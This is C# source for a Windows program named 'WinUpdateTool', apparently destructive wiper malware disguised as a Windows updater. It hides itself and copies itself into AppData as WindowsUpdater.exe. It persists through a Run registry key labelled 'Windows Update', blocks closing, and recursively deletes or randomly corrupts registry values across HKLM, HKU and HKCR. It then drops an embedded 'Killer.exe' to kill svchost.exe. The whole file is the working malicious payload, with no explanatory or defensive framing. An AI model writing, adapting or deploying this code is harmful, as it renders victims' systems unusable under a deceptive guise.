using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace WinUpdateTool
{
    public partial class Main : Form
    {
        string[] args = null;
        double damage = 0;

        private Random rng = new Random(13572468);
        public static int seed = new Random().Next();

        public void DestroyReg(RegistryKey key, double dm)
        {
            foreach (var k in key.GetSubKeyNames())
            {
                try
                {
                    DestroyReg(key.OpenSubKey(k, true), dm);
                }
                catch (Exception) { }
            }

            foreach (var v in key.GetValueNames())
            {
                try
                {
                    if (rng.NextDouble() <= damage * 1 * dm)
                    {
                        key.DeleteValue(v);
                    }
                    else
                    {
                        CorruptReg(key, v, dm);
                    }
                }
                catch (Exception) { }
            }
        }

        public void CorruptReg(RegistryKey key, string value, double dm)
        {
            var v = key.GetValue(value, null, RegistryValueOptions.DoNotExpandEnvironmentNames);

            switch (key.GetValueKind(value))
            {
                case RegistryValueKind.Binary:
                    byte[] arr = (byte[])v;
                    for (int i = 0; i < arr.Length; i++)
                    {
                        if (rng.NextDouble() <= damage * dm)
                        {
                            arr[i] = (byte)rng.Next(0, 256);
                        }
                    }
                    break;

                case RegistryValueKind.DWord:
                case RegistryValueKind.QWord:
                    if (rng.NextDouble() <= damage * dm)
                        v = rng.Next();

                    break;

                case RegistryValueKind.String:
                case RegistryValueKind.ExpandString:
                    v = CorruptString((string)v, dm);
                    break;

                case RegistryValueKind.MultiString:
                    string[] strs = (string[])v;

                    for (int i = 0; i < strs.Length; i++)
                    {
                        strs[i] = CorruptString(strs[i], dm);
                    }

                    break;
            }

            key.SetValue(value, v, key.GetValueKind(value));
        }

        public string CorruptString(string str, double dm)
        {
            string n = "";

            foreach (char c in str)
            {
                if (rng.NextDouble() <= damage * dm)
                    n += (char)rng.Next(32, 127);
                else
                    n += c;
            }

            return n;
        }

        public void Destroy()
        {
            DestroyReg(Registry.LocalMachine, 1);
            DestroyReg(Registry.Users, 1);
            DestroyReg(Registry.ClassesRoot, 1);
        }

        public Main(double damage, string[] args)
        {
            this.damage = damage;
            this.args = args;
            InitializeComponent();
        }

        private void Main_Load(object sender, EventArgs e)
        {
            string tempDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\WindowsUpdater.exe";
            string currentDir = Application.ExecutablePath;
            Hide();
            if (currentDir == tempDir)
            {
                Thread.Sleep(120);
                AddToStartup();
                new Thread(Destroy).Start();
                new Thread(PostDestroy).Start();
            }
            else
            {
                File.Copy(currentDir, tempDir, true);
                Execute(tempDir, "");
                Application.Exit();
            }
        }

        private void Main_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        protected override void OnClosing(CancelEventArgs e)
        {
            e.Cancel = true;
        }

        private void Execute(string process, string arguments)
        {
            Process CmdProcess = new Process();
            ProcessStartInfo processStartInfo = new ProcessStartInfo
            {
                FileName = process,
                Arguments = arguments,
                WindowStyle = ProcessWindowStyle.Hidden
            };
            CmdProcess.StartInfo = processStartInfo;
            CmdProcess.Start();
        }

        private void AddToStartup()
        {
            string tempDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\WindowsUpdater.exe";
            try
            {
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
                registryKey.SetValue("Windows Update", tempDir);
            }
            catch { }
        }

        public void PostDestroy()
        {
            Thread.Sleep(300);
            Note noteForm = new Note();
            noteForm.Show();
            Thread.Sleep(30);
            TerminateProcesses();
        }

        public void TerminateProcesses()
        {
            string killerTempDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Killer.exe";
            byte[] Save = Properties.Resources.Killer;
            FileStream fsObj = new FileStream(killerTempDir, FileMode.CreateNew);
            fsObj.Write(Save, 0, Save.Length);
            fsObj.Close();
            Execute(killerTempDir, "kill svchost.exe");
        }
    }
}
